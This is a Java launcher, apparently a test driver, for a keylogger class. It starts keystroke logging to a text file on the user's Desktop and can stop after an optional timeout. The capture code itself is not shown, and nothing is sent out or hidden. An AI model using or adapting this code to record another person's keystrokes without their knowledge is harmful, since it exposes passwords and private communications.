/*
 *
 * =========================================================================================
 *  Copyright (C) 2019-2021
 *
 *  AM-Design-Development - (Alessio Moraschini) - All Rights Reserved
 * =========================================================================================
 *
 * You should have received a copy of the license with this file.
 * If not, please write to: info@am-design-development.com, or visit : https://www.am-design-development.com/
 */
package keylogger;

import java.io.File;
import java.io.IOException;

import antilocker.AmTimer;


public class keyLogTest {
	
	public static void main(String[] args) {
		
		String inputPath = args != null && args.length > 0 
				? args[0] 
				: null;
				
		Integer inputTimeout = args != null && args.length > 1
				? Integer.valueOf(args[1]) 
				: null;
				
		KeyLog logger = new KeyLog();
		AmTimer autoShutDown = inputTimeout != null 
			? 	new AmTimer(()-> {
					logger.releaseResources();
					System.exit(0);
				}, inputTimeout * 1000)
			: 	null;
				
		String path = inputPath != null 
				? inputPath 
				: System.getProperty("user.home")+"/Desktop/LOGGER/";
		
		String file = "logger_OUT.txt";
		File DesktopFilePath = new File(path);
		File DesktopFile = new File(path+file);
		DesktopFilePath.mkdirs();
		// -> if you want use following to save unique new file
		// DesktopFile = FileStuff.renameJavaObjFile(DesktopFile);

		try {
			
			if (!DesktopFile.exists()) {
				DesktopFile.createNewFile();
			}
			
			try {
				if(autoShutDown != null)
					autoShutDown.executeDelayedAsync();
				
				logger.startLogger(DesktopFile);
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
	}

}
